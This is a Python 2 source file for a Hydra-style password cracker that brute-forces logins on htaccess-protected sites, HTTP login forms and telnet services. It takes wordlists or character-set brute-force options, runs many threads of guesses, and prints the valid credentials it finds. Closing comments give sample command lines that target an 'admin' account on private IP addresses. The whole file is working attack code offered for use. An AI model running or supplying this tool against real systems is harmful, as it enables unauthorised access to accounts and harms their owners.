#!/usr/bin/python

"""
Crack some passwords...

Inspired by https://www.thc.org/thc-hydra/

"""

import os
import sys
import argparse
import requests
import types
import string
from itertools import product
from Queue import Queue
import threading
from threading import Thread
import signal
import atexit
import time
from datetime import timedelta
from babel.dates import format_timedelta
import socket
from urlparse import urlparse
import re
from telnetlib import Telnet


args = None
start_time = time.time()
iteration_count = 0
login_count = 0
password_count = 0
input_queue = Queue(10000)
stdout_queue = Queue()
valid_logins = Queue()


def login_generator():
    global login_count

    if args.login:
        users = args.login.split(os.getenv('IFS', ','))
        login_count = len(users)
        for user in users:
            yield user

    elif args.login_file:
        with open(args.login_file) as fh:
            lines = fh.readlines()
        login_count = len(lines)
        for line in lines:
            yield line.strip()


def password_generator():
    global password_count

    if args.password:
        passwords = args.password.split(os.getenv('IFS', ','))
        password_count = len(passwords)
        for password in passwords:
            yield password

    elif args.password_file:
        with open(args.password_file) as fh:
            lines = fh.readlines()
            password_count = len(lines)
        for line in lines:
            yield line.strip()

    elif args.brute_force:
        _min, _max, opts = args.brute_force.split(':', 2)
        if not all([_min, _max, opts]):
            raise Exception('invalid brute force arg')
        _min = int(_min)
        _max = int(_max)
        assert _min > 0
        assert _max >= _min

        chars = ''
        if 'a' in opts:
            chars += string.lowercase
        if 'A' in opts:
            chars += string.uppercase
        if '1' in opts:
            chars += string.digits
        opts = opts.translate(None, 'aA1')
        chars += opts

        for length in xrange(_min, _max + 1):
            password_count += len(chars) ** length

        for length in xrange(_min, _max + 1):
            for combo in product(chars, repeat=length):
                yield ''.join(combo)


def input_loader():
    global iteration_count

    try:
        done = False
        for login in login_generator():
            for password in password_generator():
                input_queue.put((login, password))

                iteration_count += 1
                if args.limit and iteration_count >= args.limit:
                    done = True
                    break
            if done:
                break

    finally:
        # load sentinal values into queue to terminate workers
        for i in xrange(args.threads):
            input_queue.put((None, None))


def monitor_worker():
    while True:
        time.sleep(2)
        count = iteration_count - input_queue.qsize()
        if login_count and password_count:
            pct = count * 100 / (login_count * password_count)
        else:
            pct = 0
        time_str = format_timedelta(timedelta(seconds=(time.time() - start_time)), locale='en_US')
        stdout_queue.put('%d / %d  (%d%%) in %s' % (
            count, input_queue.qsize(), pct, time_str
        ))


def output_serializer():
    while True:
        item = stdout_queue.get()
        print item
        stdout_queue.task_done()


def abort_program(signum=None, frame=None):
    """  flush output and kill worker threads silently upon ^C  """

    # kill all of the worker threads
    for thread in threading.enumerate():
        thread.kill_received = True

    stdout_queue.join()
    sys.exit(1)


def shutdown(exception=None):
    """  should only be called after receiving ^C  """

    if iteration_count and login_count and password_count:
        print
        pct = iteration_count * 100 / (login_count * password_count)
        print 'iterations: %d   (%d%%)' % (iteration_count, pct)


################################# Hacker Classes ##############################


class Hacker(Thread):
    @staticmethod
    def getServiceName():
        return None

    @staticmethod
    def addParser(parser):
        return parser

    def __init__(self, *fargs, **kwargs):
        Thread.__init__(self, *fargs, **kwargs)

        if hasattr(self, 'init'):
            self.init()

        self.setDaemon(True)
        self.start()

    def log(self, msg):
        stdout_queue.put(msg)

    def run(self):
        while True:
            # if a valid login has been found
            if not args.all and not valid_logins.empty():
                break

            login, password = input_queue.get()

            # sentinal value - all input has been processed
            if not login and not password:
                input_queue.task_done()
                break

            try:
                res = self.attempt(login, password)
            except:
                if args.verbose > 1:
                    raise
                res = False

            if res:
                valid_logins.put((login, password))

            input_queue.task_done()

    def attempt(self, login, password):
        raise Exception('not implemented')


class HTTPHacker(Hacker):
    @staticmethod
    def addParser(parser):
        parser.add_argument('--ssl', action='store_true')
        parser.add_argument('--data', action='append', help='add form data')
        parser.add_argument('--header', action='append', help='add header to request')
        parser.add_argument('--cookie', action='append', help='add cookie to request')

        return parser

    def init(self):
        server = args.server

        url_parts = urlparse(server)
        scheme = url_parts.scheme
        port = url_parts.port

        # correct for urls like: 192.168.1.100:10
        if scheme and not url_parts.netloc:
            scheme = None
            port = url_parts.path.split('/')[0]

        if scheme:
            if scheme not in ['http', 'https']:
                raise ValueError('invalid scheme, expected "http" or "https": ' + server)
            if 'http' == scheme and args.ssl:
                raise ValueError('ssl requested but specified http')
        else:
            if args.ssl:
                server = 'https://' + server
            else:
                server = 'http://' + server

        if args.port:
            if port and (port != args.port):
                raise ValueError('--port specified but url already contains port value: ' + server)

            # see if a port was specified in the url
            port_parts = re.match('https?://(?P<host>[^/:]+)(:(?P<port>:\d+))?/?', server)
            if port_parts.group('port'):
                if (port_parts.group('port') != args.port):
                    raise ValueError('--port specified but url already contains port value: ' + server)
            else:
                server = server.replace(
                    port_parts.group('host'),
                    '%s:%d' % (port_parts.group('host'), args.port)
                )

        self.form_data = {}
        if args.data:
            for pair in '&'.join(args.data).split('&'):
                if '=' not in pair:
                    raise ValueError('invalid form data argument: ' + pair)
                key, value = pair.split('=', 1)
                self.form_data[key] = value

        self.headers = {}
        if args.header:
            for pair in '&'.join(args.header).split('&'):
                if '=' not in pair:
                    raise ValueError('invalid form data argument: ' + pair)
                key, value = pair.split('=', 1)
                self.headers[key] = value

        self.cookies = {}
        if args.cookie:
            for pair in '&'.join(args.cookie).split('&'):
                if '=' not in pair:
                    raise ValueError('invalid form data argument: ' + pair)
                key, value = pair.split('=', 1)
                self.cookies[key] = value

        self.server = server

    def makeRequest(self, method, url, **kwargs):
        params = {
            'data': self.form_data,
            'headers': self.headers,
            'cookies': self.cookies,
            'timeout': args.timeout,
        }
        params.update(kwargs)

        if 'POST' == method:
            fn = requests.post
        elif 'GET' == method:
            fn = requests.get
        else:
            raise ValueError('invalid method: ' + method)

        res = fn(url, **params)
        res.raise_for_status()

        return res


class HTAccessHacker(HTTPHacker):
    @staticmethod
    def getServiceName():
        return 'htaccess'

    def init(self):
        HTTPHacker.init(self)
        server = self.server

        parts = urlparse(server)
        if parts.username or parts.password:
            raise ValueError('url should not already have login info: ' + server)

        self.url = server.replace(parts.netloc, '^USER^:^PASS^@' + parts.netloc)

    def attempt(self, login, password):
        if args.verbose:
            url = self.url.replace('^USER^', login).replace('^PASS^', password)
            self.log(url)
        if args.debug:
            return False

        res = self.makeRequest('GET', self.server, auth=(login, password))

        if 'Authorization required' not in res.text:
            return True


class HTTPFormHacker(HTTPHacker):
    @staticmethod
    def getServiceName():
        return 'http-form'

    @staticmethod
    def addParser(parser):
        parser = HTTPHacker.addParser(parser)

        group = parser.add_mutually_exclusive_group()
        group.set_defaults(method='POST')
        group.add_argument('--get', dest='method', action='store_const', const='GET')
        group.add_argument('--post', dest='method', action='store_const', const='POST')

        parser.add_argument('--fail', action='store_true', help='interpret html_str as failure message')
        parser.add_argument('html_str')

        return parser

    def init(self):
        HTTPHacker.init(self)

        parts = urlparse(self.server)

        # if POST request, move query string to form data
        if 'POST' == args.method:
            if parts.query:
                for pair in parts.query.split('&'):
                    if '=' not in pair:
                        raise ValueError('invalid form data argument: ' + pair)
                    key, value = pair.split('=', 1)

                    if self.form_data.get(key):
                        raise KeyError('url and --data both set key: ' + key)

                    self.form_data[key] = value

                self.server = self.server.replace('?%s' % parts.query, '')

            if '^USER^' not in self.form_data.values():
                raise ValueError('^USER^ token not specified')
            if '^PASS^' not in self.form_data.values():
                raise ValueError('^PASS^ token not specified')
        else:
            # check for login / pass
            if '^USER^' not in self.server:
                raise ValueError('^USER^ token not found in server arg: ' + self.server)
            if '^PASS^' not in self.server:
                raise ValueError('^PASS^ token not found in server arg: ' + self.server)

        if args.fail:
            self.success_str = None
            self.fail_str = args.html_str
        else:
            self.success_str = args.html_str
            self.fail_str = None

    def attempt(self, login, password):
        url = self.server
        kwargs = {}

        if 'POST' == args.method:
            kwargs['data'] = {}
            for k, v in self.form_data.items():
                if '^USER^' == v:
                    kwargs['data'][k] = login
                elif '^PASS^' == v:
                    kwargs['data'][k] = password
                else:
                    kwargs['data'][k] = v
        else:
            url = url.replace('^USER^', login).replace('^PASS^', password)

        if args.verbose:
            self.log('%s : %s @ %s' % (login, password, url))
        if args.debug:
            return False

        res = self.makeRequest(args.method, url, **kwargs)

        if self.success_str and self.success_str in res.text:
            return True
        if self.fail_str and self.fail_str not in res.text:
            return True


class TelnetHacker(Hacker):
    @staticmethod
    def getServiceName():
        return 'telnet'

    def init(self):
        self.server = args.server
        self.client = Telnet()

    def attempt(self, login, password):
        if args.verbose:
            msg = '%s / %s  @  %s' % (login, password, self.server)
            self.log(msg)
        if args.debug:
            return False

        try:
            self.client.open(self.server, port=args.port, timeout=args.timeout)
            self.client.read_until('login: ', timeout=args.timeout)
            self.client.write(login + "\n")

            self.client.read_until('Password: ', timeout=args.timeout)
            self.client.write(password + "\n")

            i, match, msg = self.client.expect(["\w+.*\n"], timeout=args.timeout)
            print '"%s"' % msg
            if 'incorrect' in msg:
                return False

            # double check that we're in fact logged in
            cmd = 'echo $?'
            self.client.write(cmd + "\n")
            time.sleep(.1)
            msg = self.client.read_eager()
            if not msg.startswith(cmd):
                raise Exception('unexpected response: ' + msg)
            print '"%s"' % msg
            msg = msg[len(cmd):].strip(" \r\n")
            print '"%s"' % msg
            if not msg:
                # or did we timeout?
                return False

            if msg[0] in ['0', '1']:
                return True

            if msg[-1] in ['0', '1']:
                return True

        finally:
            self.client.close()


def main():
    parser = argparse.ArgumentParser(epilog=__doc__)
    parser.add_argument('-A', '--all', action='store_true', help='find all valid logins')
    parser.add_argument('-d', '--debug', action='store_true')
    parser.add_argument('-v', '--verbose', action='count', default=0)
    parser.add_argument('-t', '--threads', type=int, default=16)
    parser.add_argument('--limit', type=int, default=0)
    parser.add_argument('--timeout', type=float, default=0.1, help='timeout for each request')
    parser.add_argument('--port', type=int)

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-l', '--login')
    group.add_argument('-L', '--login_file')

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-p', '--password')
    group.add_argument('-P', '--password_file')
    group.add_argument('-x', dest='brute_force', help='min_size:max_size:chars')

    parser.add_argument('server')

    # load services and their parsers
    service_parsers = parser.add_subparsers(dest='service')
    service_types = {}
    for name, v in globals().items():
        if isinstance(v, types.TypeType) and issubclass(v, Hacker):
            service = v.getServiceName()
            if service:
                v.addParser(service_parsers.add_parser(service))
                service_types[service] = v

    global args
    args = parser.parse_args()

    # validate that input files exist
    if args.login_file:
        assert os.path.isfile(args.login_file)
    if args.password_file:
        assert os.path.isfile(args.password_file)

    # validate that server exists
    try:
        netloc = urlparse(args.server).netloc
        if not netloc:
            # make sure it's an IP address
            match = re.match('(?P<IP>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(/.*)?', args.server)
            # netloc = args.server.split('/')[0]  # grab ip address
            if not match:
                raise ValueError('invalid server: ' + args.server)
            netloc = match.group('IP')

        netloc = socket.gethostbyname(netloc)
    except:
        raise ValueError('invalid server: ' + args.server)

    # in case the program bails early
    signal.signal(signal.SIGINT, abort_program)
    atexit.register(shutdown)

    # start misc async helpers
    worker_fns = [
        output_serializer,
        monitor_worker,
        input_loader,
    ]

    for fn in worker_fns:
        t = Thread(target=fn, name=fn.__name__)
        t.setDaemon(True)
        t.start()

    assert args.service in service_types

    # start the workers
    worker_threads = []
    for i in range(args.threads):
        name = 'hacker-%d' % i
        t = service_types[args.service](name=name)
        worker_threads.append(t)

    # wait for the workers to finish
    while worker_threads:
        workers = []
        for t in worker_threads:
            if t.isAlive():
                t.join(1)
                workers.append(t)
        worker_threads = workers

    # flush output buffer
    stdout_queue.join()

    # clear exit handler since we're terminating cleanly
    # hack, since python 2.7 doesn't support unregister
    atexit._exithandlers = []

    # print valid logins if we found any
    exit_code = 1
    if not valid_logins.empty():
        exit_code = 0
        if args.verbose:
            print
        while not valid_logins.empty():
            login, password = valid_logins.get()
            print "valid login: %s / %s" % (login, password)

    sys.exit(exit_code)

# ./hydra.py -l admin -P passwords.dat 192.168.1.100 -t 1 -v htaccess
# ./hydra.py -l admin -x 4:4:a http://10.1.10.1/login.asp http-form --data username=^USER^ --data pws=^PASS^ --fail 'enter login'


if __name__ == "__main__":
    main()
